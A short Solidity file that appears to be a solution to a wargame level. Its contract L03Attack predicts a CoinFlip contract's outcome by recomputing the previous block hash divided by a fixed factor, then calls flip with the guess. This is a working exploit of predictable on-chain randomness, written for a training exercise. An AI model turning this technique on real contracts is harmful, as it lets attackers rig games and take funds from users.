// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { CoinFlip } from "./Level03.sol";

contract L03Attack {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip instance;

    constructor(CoinFlip _instance) {
        instance = _instance;
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        instance.flip(blockValue / FACTOR == 1);
    }
}
